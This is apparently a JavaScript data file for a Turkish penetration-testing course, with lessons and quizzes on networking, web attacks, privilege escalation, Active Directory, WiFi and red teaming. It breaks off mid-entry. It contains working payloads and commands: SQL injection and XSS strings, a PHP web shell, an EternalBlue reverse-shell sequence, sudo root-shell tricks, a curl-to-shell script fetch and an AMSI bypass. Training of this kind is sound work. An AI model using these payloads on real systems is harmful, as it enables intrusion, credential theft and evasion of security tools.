/**
 * BZT Cyber Security - Kapsamlı Hacker Eğitim Müfredatı & Bilgi Deposu (v3.5 PRO)
 * Sıfırdan En İleri Seviyeye (Zero-to-Hero) Eksiksiz Siber Güvenlik Modülleri
 */

const CURRICULUM_DATA = [
  // =========================================================================
  // FAZ 1: ALTYAPI, AĞ VE HACKER TEMELLERİ
  // =========================================================================
  {
    id: "net-foundations",
    phase: 1,
    phaseTitle: "Faz 1: Altyapı & Temeller",
    title: "Ağ Mimarisi, TCP/IP, OSI ve Paket Anatomisi",
    icon: "network",
    difficulty: "Başlangıç",
    duration: "45 dk",
    xp: 100,
    summary: "Ağ mimarisini bilmeyen bir hacker kördür. TCP 3-Way Handshake, OSI 7 Katmanı, DNS sorguları, ARP zehirlemesi ve paket yapısını derinlemesine kavrayın.",
    tags: ["TCP/IP", "OSI", "Wireshark", "DNS", "ARP", "Handshake"],
    sections: [
      {
        heading: "1. OSI Modeli ve Katmanların Hacklenmesi",
        content: `Siber güvenlikte her saldırı OSI modelinin belirli bir katmanını hedefler:
- **Katman 2 (Data Link):** MAC Adresleri, ARP protokolü. Saldırılar: ARP Spoofing/Poisoning, MAC Flooding, CAM Table Overflow.
- **Katman 3 (Network):** IP Adresleri, Yönlendirme (Routing), ICMP. Saldırılar: IP Spoofing, Ping Flood, Smurf Attack.
- **Katman 4 (Transport):** TCP & UDP. Bağlantı yönetimi, portlar. Saldırılar: SYN Flood, Port Taraması (SYN Scan, FIN Scan).
- **Katman 7 (Application):** HTTP/S, DNS, SSH, FTP, SMTP. Saldırılar: Web Enjeksiyonları (SQLi, XSS), DNS Poisoning, Man-in-the-Middle.`,
        codeSnippet: `# Wireshark / Tshark ile TCP paket başlıklarını gerçek zamanlı izleme
sudo tshark -i eth0 -f "tcp port 80" -T fields -e ip.src -e ip.dst -e tcp.flags`,
        tip: "Nmap SYN Scan (-sS), TCP 3-Way Handshake'i (SYN -> SYN/ACK -> RST) tamamlamayarak hedefte tam bağlantı logu bırakmadan portun açık olup olmadığını anlar."
      },
      {
        heading: "2. TCP 3-Way Handshake ve Saldırı Vektörleri",
        content: `Güvenli TCP iletişimi 3 adımlı el sıkışma ile başlar:
1. **SYN (Synchronize):** İstemci hedefe bağlantı isteği ve rastgele bir Sequence Number (ISN) yollar.
2. **SYN-ACK (Synchronize-Acknowledge):** Sunucu isteği kabul eder, kendi ISN'ini ve istemcinin ISN+1 değerini yollar.
3. **ACK (Acknowledge):** İstemci yanıtı doğrular ve bağlantı kurulur (ESTABLISHED).

**Hacker Taktikleri:**
- **SYN Flood:** Çok sayıda sahte IP'den SYN yollayıp ACK göndermemek sunucunun bellek tablosunu (backlog queue) tüketir (DoS).
- **TCP Reset (RST) Attack:** Hedefe sahte RST paketi enjekte ederek aktif bağlantıları zorla sonlandırma.`,
        codeSnippet: `# Python Scapy kütüphanesi ile ham TCP SYN paketi üretimi
from scapy.all import IP, TCP, send
packet = IP(dst="192.168.1.50")/TCP(dport=80, flags="S", seq=1000)
send(packet, verbose=0)`,
        terminalCommand: "nmap -sS -p 80,443 192.168.1.1"
      }
    ],
    quiz: {
      question: "Nmap'in varsayılan SYN Stealth Scan (-sS) taramasında, hedef port açıksa hedef sunucudan dönen bayrak kombinasyonu nedir?",
      options: [
        "SYN / ACK",
        "RST / ACK",
        "FIN / PSH",
        "Yalnızca ACK"
      ],
      correct: 0,
      explanation: "Açık bir port SYN paketine 'SYN/ACK' ile yanıt verir. Nmap bunu algıladığı anda RST yollayarak bağlantıyı tamamlamaz ve log oluşumunu minimize eder."
    }
  },

  {
    id: "linux-bash-mastery",
    phase: 1,
    phaseTitle: "Faz 1: Altyapı & Temeller",
    title: "Linux Çekirdeği, Özel İzinler (SUID/SGID) ve Bash Savaş Sanatı",
    icon: "terminal",
    difficulty: "Başlangıç",
    duration: "60 dk",
    xp: 120,
    summary: "Hacker dünyasının ana dili Linux'tur. Dosya izinleri (rwx, SUID, SGID), boru hatları (pipes), grep/awk filtreleri ve otomasyon scriptleri.",
    tags: ["Linux", "Bash", "SUID", "Chmod", "Grep", "Permissions"],
    sections: [
      {
        heading: "1. Özel İzinler: SUID ve SGID'nin Önemi",
        content: `Standart rwx izinlerinin ötesinde Linux'ta güvenlik açıklarına en çok yol açan izin **SUID (Set User ID - 4000)**'dir.
Bir dosyaya SUID biti verilmişse (\`-rwsr-xr-x\`), bu dosya çalıştırıldığında o anki kullanıcının değil, **dosya sahibinin (genellikle root)** yetkileriyle çalışır!

Eğer \`/bin/bash\`, \`/usr/bin/find\`, \`/usr/bin/vim\` veya hatalı derlenmiş bir binary'de SUID biti varsa, düşük yetkili bir kullanıcı saniyeler içinde Root yetkisi elde edebilir!`,
        codeSnippet: `# Sistemdeki tüm SUID bitine sahip dosyaları tespit etme
find / -perm -4000 -type f 2>/dev/null`,
        tip: "GTFOBins web sitesi, sistemdeki yerleşik Linux binary'lerinin SUID veya Sudo haklarıyla nasıl Root yetkisi verdiğini listeleyen en büyük hacker kütüphanesidir."
      },
      {
        heading: "2. Linux Pentest Tek-Satırlıkları (One-Liners)",
        content: `Bir sisteme ilk girdiğinizde durum tespiti (Discovery) için bu komutlar hayatidir:
- Aktif kullanıcılar ve gruplar: \`id\`, \`whoami\`, \`cat /etc/passwd\`
- Çalışan prosesler: \`ps aux | grep root\`
- Açık yerel portlar: \`ss -tulpn\` veya \`netstat -ano\`
- Sudo hakları: \`sudo -l\``,
        codeSnippet: `# Sudo şifresiz komut listesini sorgula
sudo -l

# Dinlenen yerel portları listele (Dışarıya kapalı iç servisleri bulmak için)
ss -antup | grep LISTEN`,
        terminalCommand: "find / -perm -u=s -type f 2>/dev/null"
      }
    ],
    quiz: {
      question: "Linux'ta bir binary'nin çalıştırıldığında kullanıcının değil, dosya sahibinin (örneğin root) yetkisiyle execute edilmesini sağlayan özel izin biti hangisidir?",
      options: [
        "SUID (Set User ID - 4000)",
        "Sticky Bit (1000)",
        "SGID (2000)",
        "Chown Bit"
      ],
      correct: 0,
      explanation: "SUID biti atanmış bir dosya, çalıştırıldığı anda dosya sahibinin (root) yetkileriyle execute edilir. Yetki yükseltmede (Privilege Escalation) en kritik vektörlerden biridir."
    }
  },

  {
    id: "python-for-hackers",
    phase: 1,
    phaseTitle: "Faz 1: Altyapı & Temeller",
    title: "Hackerlar İçin Python: Socket Programlama & Exploit Geliştirme",
    icon: "code",
    difficulty: "Orta",
    duration: "65 dk",
    xp: 130,
    summary: "Başkalarının araçlarına bağımlı kalmayın. Kendi çok kanallı port tarayıcınızı, banner grabber ve HTTP brute-force scriptinizi sıfırdan Python ile yazın.",
    tags: ["Python", "Sockets", "Exploit Development", "Port Scanner", "Scapy"],
    sections: [
      {
        heading: "1. Çok Kanallı (Multithreaded) Port Tarayıcı Mimarisi",
        content: `Python \`socket\` kütüphanesi düşük seviyeli TCP/UDP bağlantıları kurar. Bir hedefin açık portlarını tespit etmek için \`connect_ex()\` fonksiyonu kullanılır; 0 dönmesi portun açık olduğunu belirtir.`,
        codeSnippet: `import socket
import concurrent.futures

TARGET = "192.168.1.100"
PORTS = range(1, 1025)

def scan_port(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.5)
        if s.connect_ex((TARGET, port)) == 0:
            print(f"[+] Açık Port Tespit Edildi: {port}")

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(scan_port, PORTS)`,
        tip: "Socket nesnelerinde timeout ayarlamak kritik önem taşır. Aksi takdirde kapalı portlar veya güvenlik duvarı yanıt vermediğinde script sonsuza dek takılı kalabilir."
      }
    ],
    quiz: {
      question: "Python 'socket' modülünde 'connect_ex((ip, port))' fonksiyonu çağrıldığında, portun açık olduğunu belirten geri dönüş değeri nedir?",
      options: [
        "0",
        "1",
        "True",
        "200"
      ],
      correct: 0,
      explanation: "connect_ex() C seviyesindeki connect sistem çağrısını taklit eder; hata yoksa (yani bağlantı kurulduysa) 0 döndürür, aksi takdirde errno hata kodu döndürür."
    }
  },

  {
    id: "cryptography-hashing",
    phase: 1,
    phaseTitle: "Faz 1: Altyapı & Temeller",
    title: "Kriptografi Temelleri: Şifreleme, Hash Fonksiyonları & Tuzlama (Salting)",
    icon: "key",
    difficulty: "Başlangıç",
    duration: "50 dk",
    xp: 110,
    summary: "Simetrik vs Asimetrik şifreleme (AES vs RSA), tek yönlü özet fonksiyonları (MD5, SHA-256), Rainbow tabloları ve parola kırma (Hashcat) temelleri.",
    tags: ["Cryptography", "AES", "RSA", "Hash", "MD5", "Salting", "Hashcat"],
    sections: [
      {
        heading: "1. Şifreleme (Encryption) vs Özetleme (Hashing)",
        content: `- **Şifreleme (Çift Yönlü):** Bir anahtar ile açık metin gizlenir ve uygun anahtarla tekrar orijinal haline çözülebilir (AES-256, RSA).
- **Özetleme / Hash (Tek Yönlü):** Veriden sabit uzunlukta parmak izi üretilir. Matematiksel olarak geri döndürülemez (MD5, SHA-256).
- **Tuzlama (Salting):** Hash hesaplanmadan önce parolaya rastgele bir dizi eklenerek Rainbow Table (önceden hesaplanmış hash sözlükleri) saldırıları tamamen geçersiz kılınır.`,
        codeSnippet: `# Linux /etc/shadow formatındaki SHA-512 şifreli parola örneği
# $id$salt$encrypted_hash
$6$qZ7yK1mO$KzY3jY...`,
        tip: "MD5 ve SHA-1 kriptografik olarak kırılmıştır (Collision açıkları mevcuttur). Parolalar için Argon2, bcrypt veya PBKDF2 gibi kasıtlı olarak yavaş hesaplanan algoritmalar kullanılmalıdır."
      }
    ],
    quiz: {
      question: "Parola güvenliğinde önceden hesaplanmış Rainbow Tabloları ile şifre kırmayı imkansız kılan teknik hangisidir?",
      options: [
        "Tuzlama (Salting)",
        "Base64 Encoding",
        "Sıkıştırma (Compression)",
        "Simetrik Anahtar Üretimi"
      ],
      correct: 0,
      explanation: "Tuzlama (Salt), her parolaya rastgele benzersiz karakterler ekler. Böylece aynı parolayı kullanan kişilerin hash'leri dahi tamamen farklı çıkar ve Rainbow tabloları geçersiz kalır."
    }
  },

  // =========================================================================
  // FAZ 2: KEŞİF VE İSTİHBARAT TOPLAMA (RECONNAISSANCE & OSINT)
  // =========================================================================
  {
    id: "osint-recon-deep",
    phase: 2,
    phaseTitle: "Faz 2: Keşif & OSINT",
    title: "OSINT (Açık Kaynak İstihbaratı) & Hedef Haritalama",
    icon: "search",
    difficulty: "Orta",
    duration: "50 dk",
    xp: 130,
    summary: "Hedefe tek bir paket dahi atmadan Shodan, Google Dorking, DNS Brute-Force, Subdomain Enumeration ve sızdırılmış kimlik bilgilerini toplayın.",
    tags: ["OSINT", "Shodan", "Subdomains", "Google Dorks", "Amass", "DNS"],
    sections: [
      {
        heading: "1. Google Dorking ile Gizli Veri Avı",
        content: `Arama motorlarının indekslediği gizli dosyaları, yönetim panellerini ve açık veritabanı yedeklerini özel arama operatörleriyle bulun:
- \`site:hedef.com filetype:env\` -> Açıkta unutulmuş .env dosyaları (API keyler, DB şifreleri)
- \`site:hedef.com filetype:sql "dump" OR "INSERT INTO"\` -> Veritabanı yedekleri
- \`site:hedef.com inurl:admin OR inurl:login\` -> Gizli yönetim panelleri
- \`site:hedef.com ext:log OR ext:bak\` -> Sistem logları ve yedek kaynak kodları`,
        codeSnippet: `# Shodan CLI ile hedefin internete açık portlarını sorgulama
shodan host 192.168.1.1
shodan search "org:'Hedef Sirket' product:'Apache httpd'"`
      }
    ],
    quiz: {
      question: "Dışarıya açık unutulmuş veritabanı konfigürasyon dosyalarını (.env) Google üzerinden aramak için hangi dork en etkilidir?",
      options: [
        "site:hedef.com filetype:env DB_PASSWORD",
        "find .env in hedef.com",
        "search:hedef.com -type:database",
        "site:hedef.com show pass"
      ],
      correct: 0,
      explanation: "filetype:env operatörü doğrudan .env uzantılı dosyaları arar; DB_PASSWORD anahtar kelimesi ise içinde parola bulunan ortam değişkenlerini hedefler."
    }
  },

  {
    id: "active-recon-nmap",
    phase: 2,
    phaseTitle: "Faz 2: Keşif & OSINT",
    title: "Aktif Ağ Taraması: Nmap, Masscan ve NSE Zafiyet Scriptleri",
    icon: "radar",
    difficulty: "Orta",
    duration: "60 dk",
    xp: 140,
    summary: "Nmap bayraklarının gizemini çözün. IDS atlatma (-T0 to -T5), zafiyet motoru (NSE), UDP port taraması ve Masscan ile dakikada milyonlarca port tarama.",
    tags: ["Nmap", "Masscan", "NSE", "Port Scanning", "Network Recon"],
    sections: [
      {
        heading: "1. Kritik Nmap Parametre Kombinasyonları",
        content: `- \`-sS\`: TCP SYN Stealth Scan (Yarım bağlantı, log oluşturmaz).
- \`-sV\`: Servis sürüm tespiti (Apache, OpenSSH, Nginx sürümleri).
- \`-sC\`: Güvenli varsayılan NSE (Nmap Scripting Engine) scriptlerini çalıştırır.
- \`-p-\`: 1 ile 65535 arasındaki tüm portları tarar.
- \`-Pn\`: ICMP Ping paketlerini atlar (Güvenlik duvarı ping engelliyorsa şarttır).`,
        codeSnippet: `# Standart Profesyonel Keşif Taraması
nmap -sS -sV -sC -Pn -T4 -p- -oA kapsamli_tarama 10.10.10.50`,
        terminalCommand: "nmap -sV -sC -Pn 192.168.1.100"
      }
    ],
    quiz: {
      question: "Hedef sunucu ICMP Echo (Ping) isteklerini engellediğinde Nmap'in hedefin açık olduğunu varsayıp taramayı sürdürmesini sağlayan parametre hangisidir?",
      options: [
        "-Pn",
        "-sS",
        "-sP",
        "-n"
      ],
      correct: 0,
      explanation: "-Pn parametresi Nmap'e hedefi önceden pinglememesini söyler; hedef ping yanıtı vermese bile tüm portları taramaya devam eder."
    }
  },

  // =========================================================================
  // FAZ 3: WEB SIZMA TESTLERİ (OWASP TOP 10)
  // =========================================================================
  {
    id: "sqli-exploitation",
    phase: 3,
    phaseTitle: "Faz 3: Web Sızma Testleri",
    title: "SQL Injection: Union, Error, Blind & Time-Based Sömürü",
    icon: "database",
    difficulty: "İleri",
    duration: "75 dk",
    xp: 180,
    summary: "Veritabanının kontrolünü ele geçirin. Kimlik doğrulama bypass, Union-based veri sızdırma, Error-based sömürü ve SQLMap ile otomasyon.",
    tags: ["SQLi", "OWASP", "Union-Based", "Blind SQLi", "SQLMap", "Database"],
    sections: [
      {
        heading: "1. Kimlik Doğrulama Bypass (Authentication Bypass)",
        content: `Geliştirici parametreleri filtrelemeden doğrudan SQL sorgusuna eklerse:
\`SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'\`

Kullanıcı adı alanına \`admin' --\` girildiğinde sorgu şuna dönüşür:
\`SELECT * FROM users WHERE username = 'admin' --' AND password = '...'\`
\`--\` işareti SQL'de yorum satırı olduğundan şifre kontrolü tamamen yok sayılır ve sisteme admin olarak giriş yapılır!`,
        codeSnippet: `' OR '1'='1' --
' OR 1=1 #
admin' /*
' UNION SELECT null, username, password FROM users --`,
        tip: "Modern ORM'ler (Prisma, Hibernate, Entity Framework) ve Prepared Statements (Parametreli Sorgular) SQL Injection'ı %100 oranında engeller."
      }
    ],
    quiz: {
      question: "Bir Union-Based SQL Injection saldırısında, orijinal sorgunun kaç sütun döndürdüğünü öğrenmek için en sık kullanılan SQL ifadesi nedir?",
      options: [
        "ORDER BY n --",
        "GROUP BY id --",
        "COUNT(columns) --",
        "DESCRIBE table --"
      ],
      correct: 0,
      explanation: "ORDER BY 1, ORDER BY 2... şeklinde artırılarak hata alınan sayıya kadar denenir. Hata alındığı andaki sayı - 1, orijinal sorgunun sütun sayısını verir."
    }
  },

  {
    id: "xss-csrf-dom",
    phase: 3,
    phaseTitle: "Faz 3: Web Sızma Testleri",
    title: "Cross-Site Scripting (XSS) & Oturum Çalma (Session Hijacking)",
    icon: "code",
    difficulty: "Orta",
    duration: "55 dk",
    xp: 150,
    summary: "Kullanıcıların tarayıcısında zararlı JavaScript kodları çalıştırın. Reflected, Stored ve DOM-based XSS türleri, WAF atlatma ve Cookie hırsızlığı.",
    tags: ["XSS", "Reflected", "Stored", "Cookie Stealing", "WAF Bypass"],
    sections: [
      {
        heading: "1. XSS Türleri ve Çalışma Mantığı",
        content: `- **Reflected (Yansıyan) XSS:** URL parametresi sayfada anlık olarak filtrelenmeden yansıtıldığında çalışır (Kurbana özel link tıklatılmalıdır).
- **Stored (Kalıcı) XSS:** En tehlikelisidir. Yorum veya profil ismi veritabanına kaydedilir; o sayfayı açan HERKESİN tarayıcısında otomatik çalışır.
- **DOM-based XSS:** İstemci tarafındaki JavaScript kodunun (\`eval\`, \`innerHTML\`, \`document.write\`) güvensiz veri işlemesi sonucu oluşur.`,
        codeSnippet: `<!-- Temel XSS Test Payloadları -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert('XSS')>`
      }
    ],
    quiz: {
      question: "Hangi güvenlik bayrağı (Cookie Flag), JavaScript'in document.cookie üzerinden çereze erişmesini engelleyerek XSS saldırılarına karşı oturumu korur?",
      options: [
        "HttpOnly",
        "Secure",
        "SameSite=Strict",
        "Domain-Restricted"
      ],
      correct: 0,
      explanation: "HttpOnly bayrağı çerezin yalnızca HTTP isteklerinde gönderilmesini sağlar, tarayıcı içi betiklerin (JS) çerezi okumasını engeller."
    }
  },

  {
    id: "rce-ssrf-deserialization",
    phase: 3,
    phaseTitle: "Faz 3: Web Sızma Testleri",
    title: "RCE, SSRF, LFI ve Dosya Yükleme (File Upload) Zafiyetleri",
    icon: "shield-alert",
    difficulty: "İleri",
    duration: "70 dk",
    xp: 190,
    summary: "En kritik web açıkları: Sunucuda komut çalıştırma (RCE), iç ağa atlama (SSRF) ve dosya yükleme kontrollerini bypass ederek Web Shell atma.",
    tags: ["RCE", "SSRF", "File Upload", "LFI", "Webshell", "Reverse Shell"],
    sections: [
      {
        heading: "1. File Upload Zafiyeti & Web Shell Yükleme",
        content: `Uygulamada dosya uzantısı kontrolü eksikse, PHP/ASP/JSP web shell yüklenerek sunucuda tam komut çalıştırma kontrolü elde edilir.
**Bypass Taktikleri:**
- Alternatif Uzantılar: \`.phtml\`, \`.php5\`, \`.phar\`, \`.pht\`
- Çift Uzantı: \`shell.php.jpg\` veya Null Byte: \`shell.php%00.jpg\`
- Content-Type Değiştirme: \`application/x-php\` yerine \`image/jpeg\` yollama
- Magic Bytes Ekleme: Dosyanın başına \`GIF89a;\` ekleyerek resim gibi gösterme`,
        codeSnippet: `<?php system($_GET['cmd']); ?>`
      }
    ],
    quiz: {
      question: "AWS EC2 sanal sunucularında IAM rolleri ve geçici erişim anahtarlarını barındıran yerel Instance Metadata IP adresi hangisidir?",
      options: [
        "169.254.169.254",
        "127.0.0.1",
        "10.0.0.1",
        "192.168.0.254"
      ],
      correct: 0,
      explanation: "169.254.169.254 AWS link-local IP'sidir; SSRF açığı bulunan bir web sunucusu üzerinden bu IP'ye istek atılarak bulut hesap anahtarları çalınabilir."
    }
  },

  {
    id: "burpsuite-masterclass",
    phase: 3,
    phaseTitle: "Faz 3: Web Sızma Testleri",
    title: "Burp Suite Masterclass: Proxy, Repeater, Intruder ve Fuzzing",
    icon: "layers",
    difficulty: "Orta",
    duration: "60 dk",
    xp: 140,
    summary: "Web sızma test uzmanının bir numaralı aracı. HTTP/S trafiğini yakalama, paketleri anlık modifiye etme, oturum analizi ve Intruder ile brute-force.",
    tags: ["Burp Suite", "Proxy", "Repeater", "Intruder", "Fuzzing", "HTTP"],
    sections: [
      {
        heading: "1. Burp Proxy ve Repeater Kullanımı",
        content: `Burp Suite tarayıcı ile web sunucusu arasına girerek tüm istekleri (GET, POST, PUT, DELETE) ve yanıtları yakalar.
- **Proxy Intercept:** Paketi sunucuya gitmeden havada durdurup parametreleri elle değiştirmeyi sağlar.
- **Repeater (Ctrl+R):** Aynı HTTP isteğini parametreleri değiştirerek defalarca sunucuya yollayıp anlık yanıtları inceleme alanıdır.
- **Intruder (Ctrl+I):** Parola kırma, dizin tarama ve parametre fuzzing için otomatik yük enjeksiyon motorudur.`,
        codeSnippet: `# Burp CA Sertifikasını Firefox'a ekleme:
http://burp -> CA Certificate indir -> Firefox Ayarlar -> Authorities -> Import`,
        tip: "Burp Intruder'da Sniper saldırı tipi tek bir payload listesini sırayla her pozisyona denerken, Cluster Bomb çoklu listeleri (kullanıcı adı + parola kombinasyonları) çapraz olarak dener."
      }
    ],
    quiz: {
      question: "Burp Suite'te yakalanan bir HTTP isteğini parametrelerini elle modifiye edip defalarca manuel test etmek için hangi sekmeye göndermek gerekir?",
      options: [
        "Repeater (Ctrl+R)",
        "Intruder (Ctrl+I)",
        "Decoder (Ctrl+D)",
        "Comparer"
      ],
      correct: 0,
      explanation: "Repeater sekmesi, yakalanan bir isteği tek tıkla izole edip istek gövdesini ve başlıklarını dilediğiniz gibi düzenleyerek hızlıca sunucuya iletmenizi sağlar."
    }
  },

  // =========================================================================
  // FAZ 4: SİSTEM & AĞ SIZMA TESTLERİ (SYSTEM EXPLOITATION & PRIVESC)
  // =========================================================================
  {
    id: "metasploit-exploitation",
    phase: 4,
    phaseTitle: "Faz 4: Sistem & Ağ Sızma",
    title: "Metasploit Framework, Shellcoding ve Meterpreter",
    icon: "cpu",
    difficulty: "Orta",
    duration: "65 dk",
    xp: 160,
    summary: "Dünyanın en popüler sızma testi çerçevesi. Hedefe uygun exploit seçimi, payload oluşturma (msfvenom), Meterpreter ile post-exploitation taktikleri.",
    tags: ["Metasploit", "Meterpreter", "msfvenom", "Payload", "Post-Exploitation"],
    sections: [
      {
        heading: "1. Metasploit Mimarisi ve Temel İş Akışı",
        content: `Metasploit bileşenleri:
- **Exploit:** Hedefteki açığı tetikleyen kod parçası.
- **Payload:** Açık tetiklendikten sonra hedefte çalışacak olan kod (Örn: Reverse Shell, Meterpreter).
- **Auxiliary:** Tarama, keşif ve DoS modülleri.
- **Post:** Sızma sonrası yetki yükseltme, parola hashlerini çekme modülleri.`,
        codeSnippet: `# Metasploit başlatma ve örnek modül kullanımı
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit`
      }
    ],
    quiz: {
      question: "Metasploit'te diske dosya yazmadan doğrudan RAM üzerinde çalışarak tespit edilmeyi zorlaştıran gelişmiş payload türü hangisidir?",
      options: [
        "Meterpreter",
        "Command Shell",
        "Stager Raw",
        "Inline Bash"
      ],
      correct: 0,
      explanation: "Meterpreter, dinamik kütüphanelerini doğrudan hedef bellek alanına yükleyerek çalışan gelişmiş bir payload'dur."
    }
  },

  {
    id: "linux-privesc",
    phase: 4,
    phaseTitle: "Faz 4: Sistem & Ağ Sızma",
    title: "Linux Yetki Yükseltme (PrivEsc): SUID, Sudo, Cronjobs & LinPEAS",
    icon: "award",
    difficulty: "Uzman",
    duration: "80 dk",
    xp: 200,
    summary: "Düşük yetkili bir kullanıcıdan ROOT yetkilerine tırmanın. Sudo NOPASSWD açıkları, SUID binary istismarları, cronjob zehirleme ve LinPEAS otomasyonu.",
    tags: ["PrivEsc", "Linux PrivEsc", "LinPEAS", "SUID", "GTFOBins", "Root"],
    sections: [
      {
        heading: "1. Sudo NOPASSWD Kötüye Kullanımı",
        content: `\`sudo -l\` çıktısında kullanıcının şifresiz çalıştırabileceği bir komut görülürse, GTFOBins kullanılarak derhal root kabuk alınır:
- \`sudo find . -exec /bin/sh \\; -quit\`
- \`sudo vim -c ':!/bin/sh'\`
- \`sudo less /etc/hosts\` (içindeyken \`!/bin/sh\` yazılır)`,
        codeSnippet: `# LinPEAS otomasyon scriptini hedefte çalıştırma
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`,
        terminalCommand: "sudo -l"
      }
    ],
    quiz: {
      question: "Linux'ta 'sudo -l' komutunda '/usr/bin/find' komutunun şifresiz çalıştırılabildiği görülürse, anında Root yetkisine geçiş komutu hangisidir?",
      options: [
        "sudo find . -exec /bin/sh \\; -quit",
        "sudo find --root",
        "find -u root",
        "sudo find /bin/bash"
      ],
      correct: 0,
      explanation: "find aracının -exec bayrağı bulunan her dosya için belirtilen komutu çalıştırma yeteneği vardır; /bin/sh root yetkileriyle çağrılır."
    }
  },

  {
    id: "active-directory-attacks",
    phase: 4,
    phaseTitle: "Faz 4: Sistem & Ağ Sızma",
    title: "Active Directory Sızma Testleri & Domain Dominance",
    icon: "server",
    difficulty: "Uzman",
    duration: "90 dk",
    xp: 220,
    summary: "Kurumsal ağların kalbi Active Directory. Kerberoasting, AS-REP Roasting, Pass-the-Hash, BloodHound ile saldırı yolları analizi ve Golden Ticket.",
    tags: ["Active Directory", "Kerberoasting", "BloodHound", "Mimikatz", "Golden Ticket", "Domain Admin"],
    sections: [
      {
        heading: "1. Kerberoasting Saldırısı",
        content: `Active Directory ortamında SPN (Service Principal Name) tanımlı kullanıcı hesaplarının TGS biletleri talep edilebilir. Bu bilet servis hesabının NTLM hash'i ile şifrelidir ve Hashcat ile offline kırılabilir!`,
        codeSnippet: `# Impacket GetUserSPNs ile Kerberoastable hesapları çekme
GetUserSPNs.py domain.local/kullanici:parola -dc-ip 192.168.1.10 -request -outputfile tgs_hashes.txt

# Hashcat ile bileti kırma (Mode 13100)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt`
      }
    ],
    quiz: {
      question: "Active Directory'de SPN kayıtlı servis hesaplarının TGS biletlerini çevrimdışı parola kırma amacıyla talep etme saldırısının adı nedir?",
      options: [
        "Kerberoasting",
        "AS-REP Roasting",
        "Pass-the-Ticket",
        "Silver Ticket"
      ],
      correct: 0,
      explanation: "Kerberoasting, normal bir domain kullanıcısının SPN tanımlı hesaplar için TGS bileti talep edip ardından bu bileti offline brute-force ile kırması tekniğidir."
    }
  },

  // =========================================================================
  // FAZ 5: KABLOSUZ AĞLAR & SOSYAL MÜHENDİSLİK
  // =========================================================================
  {
    id: "wireless-social-eng",
    phase: 5,
    phaseTitle: "Faz 5: Kablosuz Ağ & Sosyal Mühendislik",
    title: "Kablosuz Ağ Güvenliği (WiFi) & İleri Sosyal Mühendislik",
    icon: "wifi",
    difficulty: "Orta",
    duration: "55 dk",
    xp: 140,
    summary: "Havadan sızma: WPA2/3 4-Way Handshake yakalama, Deauth saldırıları, Evil Twin sahte erişim noktaları ve kimlik avı (Phishing) teknikleri.",
    tags: ["WiFi", "Aircrack-ng", "Handshake", "Evil Twin", "Phishing", "Social Engineering"],
    sections: [
      {
        heading: "1. Aircrack-ng ile WiFi Handshake Yakalama",
        content: `Kablosuz ağ kartı monitör moda alınarak ortamdaki tüm paketler dinlenir:
1. Kartı monitör moda alma: \`airmon-ng start wlan0\`
2. Ağları tarama: \`airodump-ng wlan0mon\`
3. İstemciyi deauth paketleriyle düşürme: \`aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon\`
4. Yakalanan Handshake dosyasını parola listesiyle kırma.`,
        codeSnippet: `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 handshake.cap`
      }
    ],
    quiz: {
      question: "Aircrack-ng paketinde bir istemciyi kablosuz erişim noktasından geçici olarak koparıp yeniden bağlanmaya zorlayarak handshake yakalamak için hangi komut kullanılır?",
      options: [
        "aireplay-ng --deauth",
        "airodump-ng --kick",
        "aircrack-ng --disconnect",
        "airmon-ng --drop"
      ],
      correct: 0,
      explanation: "aireplay-ng -0 (veya --deauth) komutu hedefe deauthentication paketleri yollar, istemci kopup geri bağlanırken 4-Way handshake yakalanır."
    }
  },

  // =========================================================================
  // FAZ 6: RED TEAMING & ANTİVİRÜS ATLATMA (EVASION)
  // =========================================================================
  {
    id: "red-team-evasion",
    phase: 6,
    phaseTitle: "Faz 6: Red Teaming & Evasion",
    title: "AV/EDR Atlatma (Bypass), AMSI & Komuta Kontrol (C2) Mimarileri",
    icon: "eye-off",
    difficulty: "Uzman",
    duration: "85 dk",
    xp: 240,
    summary: "Modern savunma sistemlerini (Windows Defender, CrowdStrike, SentinelOne) aşma. Bellek içi enjeksiyon (In-Memory Injection), AMSI Bypass, Shellcode şifreleme ve C2 sunucuları.",
    tags: ["Red Team", "AV Bypass", "AMSI", "EDR", "C2", "Sliver", "Havoc"],
    sections: [
      {
        heading: "1. Antivirüs ve EDR Kancalarını (Hooks) Aşma",
        content: `EDR'lar \`ntdll.dll\` içindeki kritik API fonksiyonlarına kanca atarak prosesleri izler.
Red Team uzmanları bu kancaları aşmak için **Direct Syscalls (Doğrudan Sistem Çağrıları)** veya unhooking teknikleri kullanır.`,
        codeSnippet: `# PowerShell AMSI Bypass tek satırlığı
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
      }
    ],
    quiz: {
      question: "Windows'ta çalışan scriptlerin (PowerShell, VBScript) bellek içinde taranıp güvenlik yazılımına bildirilmesini sağlayan Windows arabirimi nedir?",
      options: [
        "AMSI (Antimalware Scan Interface)",
        "UAC (User Account Control)",
        "AppLocker",
        "DEP (Data Execution Prevention)"
      ],
      correct: 0,
      explanation: "AMSI (Antimalware Scan Interface), betiklerin bellekte execute edilmeden önce antivirüs motorlarına gönderilip taranmasını sağlayan standart arayüzdür."
    }
  },

  // =========================================================================
  // FAZ 7: MAVİ TAKIM, SOC & SERTİFİKASYON REHBERİ
  // =========================================================================
  {
    id: "blue-team-career",
    phase: 7,
    phaseTitle: "Faz 7: Mavi Takım & Kariyer",
    title: "SOC Analistliği, Paket Analizi & Hacker Sertifikasyon Yol Haritası",
    icon: "shield-check",
    difficulty: "Orta",
    duration: "60 dk",
    xp: 150,
    summary: "Hücumu bilen en iyi savunmayı yapar. Wireshark ile zararlı trafik tespiti, SIEM log korelasyonu ve OSCP, CEH, eJPT, CISSP sınav rehberi.",
    tags: ["Blue Team", "SOC", "Wireshark", "OSCP", "eJPT", "Certifications", "Career"],
